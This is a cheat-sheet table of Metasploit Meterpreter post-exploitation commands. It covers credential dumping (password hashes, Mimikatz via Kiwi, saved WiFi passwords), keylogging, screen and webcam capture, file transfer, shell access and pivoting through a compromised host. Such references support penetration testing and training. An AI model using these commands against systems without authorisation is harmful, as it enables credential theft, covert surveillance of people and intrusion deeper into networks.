# Metasploit: Meterpreter — Commands

| Command | Description |
|---------|-------------|
| `getuid` | Display the current user |
| `sysinfo` | Display system information (OS, architecture) |
| `getpid` | Display the current process ID |
| `ps` | List running processes |
| `migrate <PID>` | Migrate to a specified process |
| `getsystem` | Attempt privilege escalation to SYSTEM |
| `hashdump` | Dump NTLM password hashes from SAM |
| `load kiwi` | Load the Kiwi module (Mimikatz) |
| `creds_all` | Dump all credentials via Kiwi |
| `lsa_dump_sam` | Dump SAM database via Kiwi |
| `wifi_list` | List saved WiFi networks and passwords |
| `keyscan_start` | Start the keylogging daemon |
| `keyscan_dump` | Dump captured keystrokes |
| `screenshot` | Capture the target's screen |
| `webcam_snap` | Capture an image from the webcam |
| `download <remote>` | Download a file from the target |
| `upload <local> <remote>` | Upload a file to the target |
| `shell` | Drop into a standard system shell |
| `run autoroute -s <subnet>` | Add a route for pivoting |
| `portfwd add -l <local> -p <remote> -r <host>` | Forward a port through the session |
| `background` | Background the current Meterpreter session |
| `sessions -i <id>` | Return to a backgrounded session |
